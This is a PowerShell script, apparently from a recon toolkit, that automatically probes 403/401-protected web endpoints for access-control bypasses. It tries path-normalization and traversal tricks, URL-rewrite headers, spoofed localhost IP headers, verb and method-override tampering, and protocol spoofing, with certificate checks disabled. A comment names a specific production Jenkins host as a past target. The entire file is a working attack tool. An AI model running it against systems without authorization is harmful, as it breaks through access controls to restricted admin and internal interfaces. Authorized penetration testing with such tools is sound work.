<#
.SYNOPSIS
    Automated HTTP 403/401 Forbidden & Reverse Proxy Access Control Bypass Prober.

.DESCRIPTION
    Tests restricted web endpoints (returning 403 Forbidden or 401 Unauthorized) against
    path normalizations, URL rewrite headers, IP spoofing, and HTTP method overrides.

.PARAMETER TargetUrl
    The restricted URL to test (e.g. https://target.com/admin or https://target.com/api/internal).

.PARAMETER BaselineStatus
    The baseline expected status code (default: 403).

.PARAMETER OutputJson
    Optional path to save anomalies (default: recon/bypasses_403.json).

.EXAMPLE
    .\scripts\test_403_bypasses.ps1 -TargetUrl "https://target.com/admin" -BaselineStatus 403
#>

param(
    [Parameter(Mandatory=$true)]
    [string]$TargetUrl,

    [int]$BaselineStatus = 403,
    [string]$OutputJson = "recon/bypasses_403.json",
    [int]$TimeoutSec = 8,
    [string]$Wordlist = "payloads/headers/403_bypass_headers.txt",
    [switch]$Extended
)

$ErrorActionPreference = "SilentlyContinue"

Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "   HTTP 403/401 Access Control Bypass Prober" -ForegroundColor Yellow
Write-Host "   Target: $TargetUrl" -ForegroundColor White
Write-Host "==========================================================" -ForegroundColor Cyan

$handler = [System.Net.Http.HttpClientHandler]::new()
$handler.ServerCertificateCustomValidationCallback = { $true }
$handler.AllowAutoRedirect = $false
# Force TLS 1.2 — some targets (e.g. jenkins-prod.mtn.ci) fail the default SChannel negotiation
$handler.SslProtocols = [System.Security.Authentication.SslProtocols]::Tls12
$client = [System.Net.Http.HttpClient]::new($handler)
$client.Timeout = [TimeSpan]::FromSeconds($TimeoutSec)
$client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

$targetUri = [System.Uri]$TargetUrl
$baseDomain = "$($targetUri.Scheme)://$($targetUri.Authority)"
$path = $targetUri.AbsolutePath
$query = $targetUri.Query

# 1. Baseline Request
Write-Host "[*] Establishing baseline response..." -ForegroundColor Cyan
try {
    $baseReq = [System.Net.Http.HttpRequestMessage]::new([System.Net.Http.HttpMethod]::Get, $TargetUrl)
    $baseResp = $client.SendAsync($baseReq).GetAwaiter().GetResult()
    $baseStatus = [int]$baseResp.StatusCode
    $baseBody = $baseResp.Content.ReadAsStringAsync().GetAwaiter().GetResult()
    $baseLen = if ($baseBody) { $baseBody.Length } else { 0 }
    Write-Host "[+] Baseline Status: $baseStatus | Body Length: $baseLen bytes" -ForegroundColor Green
} catch {
    Write-Host "[-] Failed to reach target: $($_.Exception.Message)" -ForegroundColor Red
    return
}

$anomalies = [System.Collections.Generic.List[PSCustomObject]]::new()

function Test-Payload {
    param(
        [string]$Category,
        [string]$Name,
        [string]$Url,
        [System.Net.Http.HttpMethod]$Method = [System.Net.Http.HttpMethod]::Get,
        [hashtable]$Headers = @{}
    )

    try {
        $req = [System.Net.Http.HttpRequestMessage]::new($Method, $Url)
        foreach ($k in $Headers.Keys) {
            $val = $Headers[$k]
            # Try adding to default or content headers
            $req.Headers.TryAddWithoutValidation($k, $val) | Out-Null
        }

        $resp = $client.SendAsync($req).GetAwaiter().GetResult()
        $sc = [int]$resp.StatusCode
        $respBody = $resp.Content.ReadAsStringAsync().GetAwaiter().GetResult()
        $respLen = if ($respBody) { $respBody.Length } else { 0 }

        $lenDiff = [Math]::Abs($respLen - $baseLen)
        $statusDiff = ($sc -ne $baseStatus)

        if ($statusDiff -or ($lenDiff -gt 80 -and $sc -eq 200)) {
            $color = if ($sc -in @(200, 201, 204)) { "Green" } elseif ($sc -in @(301, 302, 307, 308)) { "Yellow" } else { "Magenta" }
            Write-Host "[!] [$Category] $Name -> Status: $sc (was $baseStatus), Length: $respLen (diff: $lenDiff)" -ForegroundColor $color

            $script:anomalies.Add([PSCustomObject]@{
                Category = $Category
                Name = $Name
                Url = $Url
                Method = $Method.Method
                Headers = $Headers
                StatusCode = $sc
                BodyLength = $respLen
                LengthDiff = $lenDiff
            })
        }
    } catch {}
}

# --- A. URL Path Manipulations & Normalization ---
Write-Host "`n[*] Testing URL Path Manipulations..." -ForegroundColor Cyan

$pathBypasses = @(
    @{ Name = "Append Dot"; Url = "$baseDomain$path." },
    @{ Name = "Append Slash"; Url = "$baseDomain$path/" },
    @{ Name = "Double Slash Prefix"; Url = "$baseDomain//$path" },
    @{ Name = "Traversal DotSlash"; Url = "$baseDomain/.$path" },
    @{ Name = "URL Encoded Dot"; Url = "$baseDomain/%2e$path" },
    @{ Name = "Tomcat Matrix SemiColon"; Url = "$baseDomain$path;" },
    @{ Name = "Tomcat Traversal Semicolon"; Url = "$baseDomain/anything/..;$path" },
    @{ Name = "Trailing Semicolon Parameter"; Url = "$baseDomain$path;param=1" },
    @{ Name = "Append Space Encoded"; Url = "$baseDomain$path%20" },
    @{ Name = "Append Tab Encoded"; Url = "$baseDomain$path%09" },
    @{ Name = "Append Null Byte"; Url = "$baseDomain$path%00" },
    @{ Name = "Append .json Extension"; Url = "$baseDomain$path.json" },
    @{ Name = "Append Query Parameter"; Url = "$baseDomain$path?anything" },
    @{ Name = "Append Hash"; Url = "$baseDomain$path#" },
    @{ Name = "Uppercase Path"; Url = "$baseDomain$($path.ToUpper())" }
)

foreach ($p in $pathBypasses) {
    Test-Payload -Category "Path-Manipulation" -Name $p.Name -Url $p.Url
}

# --- B. URL Rewrite Headers ---
Write-Host "`n[*] Testing Request Rewriting Headers..." -ForegroundColor Cyan

$rewriteHeaders = @(
    @{ Name = "X-Original-URL"; Headers = @{ "X-Original-URL" = $path } },
    @{ Name = "X-Rewrite-URL"; Headers = @{ "X-Rewrite-URL" = $path } },
    @{ Name = "X-Override-URL"; Headers = @{ "X-Override-URL" = $path } },
    @{ Name = "X-Forwarded-Prefix"; Headers = @{ "X-Forwarded-Prefix" = $path } },
    @{ Name = "Base-Url"; Headers = @{ "Base-Url" = $path } },
    @{ Name = "Request-Uri"; Headers = @{ "Request-Uri" = $path } }
)

foreach ($r in $rewriteHeaders) {
    # Send rewrite headers against root / or harmless path
    Test-Payload -Category "Header-Rewrite" -Name $r.Name -Url "$baseDomain/" -Headers $r.Headers
}

# --- C. Client IP & Trust Spoofing Headers ---
Write-Host "`n[*] Testing IP & Network Spoofing Headers..." -ForegroundColor Cyan

$ips = @("127.0.0.1", "localhost", "0.0.0.0", "10.0.0.1", "192.168.1.1", "0x7f000001", "2130706433", "::1")
$ipHeaders = @(
    "X-Forwarded-For",
    "X-Real-IP",
    "True-Client-IP",
    "Client-IP",
    "X-Custom-IP-Authorization",
    "Cluster-Client-IP",
    "X-Remote-IP",
    "X-Remote-Addr",
    "X-Client-IP",
    "X-Originating-IP"
)

foreach ($h in $ipHeaders) {
    Test-Payload -Category "IP-Spoofing" -Name "$h : 127.0.0.1" -Url $TargetUrl -Headers @{ $h = "127.0.0.1" }
    Test-Payload -Category "IP-Spoofing" -Name "$h : 10.0.0.1" -Url $TargetUrl -Headers @{ $h = "10.0.0.1" }
    Test-Payload -Category "IP-Spoofing" -Name "$h : 0x7f000001" -Url $TargetUrl -Headers @{ $h = "0x7f000001" }
}

# --- D. HTTP Verb Overrides ---
Write-Host "`n[*] Testing HTTP Verb & Method Overrides..." -ForegroundColor Cyan

$verbs = @(
    [System.Net.Http.HttpMethod]::Post,
    [System.Net.Http.HttpMethod]::Put,
    [System.Net.Http.HttpMethod]::Delete,
    [System.Net.Http.HttpMethod]::Trace,
    [System.Net.Http.HttpMethod]::Options,
    [System.Net.Http.HttpMethod]::Head
)

foreach ($v in $verbs) {
    Test-Payload -Category "Method-Tampering" -Name "HTTP Verb: $($v.Method)" -Url $TargetUrl -Method $v
}

# Method Override Headers
$methodOverrides = @("GET", "POST", "PUT", "PATCH", "HEAD")
foreach ($m in $methodOverrides) {
    Test-Payload -Category "Method-Override-Header" -Name "X-HTTP-Method-Override: $m" -Url $TargetUrl -Headers @{ "X-HTTP-Method-Override" = $m }
    Test-Payload -Category "Method-Override-Header" -Name "X-Method-Override: $m" -Url $TargetUrl -Headers @{ "X-Method-Override" = $m }
}

# --- E. Protocol & Port Spoofing ---
Write-Host "`n[*] Testing Protocol & Port Spoofing..." -ForegroundColor Cyan

Test-Payload -Category "Protocol-Spoofing" -Name "X-Forwarded-Port: 80" -Url $TargetUrl -Headers @{ "X-Forwarded-Port" = "80" }
Test-Payload -Category "Protocol-Spoofing" -Name "X-Forwarded-Port: 443" -Url $TargetUrl -Headers @{ "X-Forwarded-Port" = "443" }
Test-Payload -Category "Protocol-Spoofing" -Name "X-Forwarded-Proto: https" -Url $TargetUrl -Headers @{ "X-Forwarded-Proto" = "https" }
Test-Payload -Category "Protocol-Spoofing" -Name "X-Forwarded-Scheme: https" -Url $TargetUrl -Headers @{ "X-Forwarded-Scheme" = "https" }

# --- F. Extended Header Brute-force (from payloads/headers/403_bypass_headers.txt) ---
if ($Extended -and (Test-Path $Wordlist)) {
    Write-Host "`n[*] Running Extended Wordlist Header Testing from $Wordlist..." -ForegroundColor Cyan
    $extHeaders = Get-Content $Wordlist | Where-Object { $_ -match ":" }
    $extCount = 0
    foreach ($line in $extHeaders) {
        $extCount++
        $parts = $line.Split(":", 2)
        if ($parts.Length -eq 2) {
            $hk = $parts[0].Trim()
            $hv = $parts[1].Trim()
            Write-Host -NoNewline "`r[*] [$extCount/$($extHeaders.Count)] Testing: ${hk}: $hv"
            Test-Payload -Category "Extended-Header" -Name "${hk}: $hv" -Url $TargetUrl -Headers @{ $hk = $hv }
        }
    }
    Write-Host ""
}

$client.Dispose()
$handler.Dispose()

Write-Host "`n==========================================================" -ForegroundColor Cyan
Write-Host "   Scan Complete! Total Anomalies/Bypasses Discovered: $($anomalies.Count)" -ForegroundColor Yellow
Write-Host "==========================================================" -ForegroundColor Cyan

if ($anomalies.Count -gt 0) {
    $outDir = [System.IO.Path]::GetDirectoryName($OutputJson)
    if ($outDir -and -not (Test-Path $outDir)) { New-Item -ItemType Directory -Path $outDir -Force | Out-Null }
    $anomalies | ConvertTo-Json -Depth 4 | Set-Content -Path $OutputJson -Encoding UTF8
    Write-Host "[+] Bypasses saved to: $OutputJson" -ForegroundColor Green
}
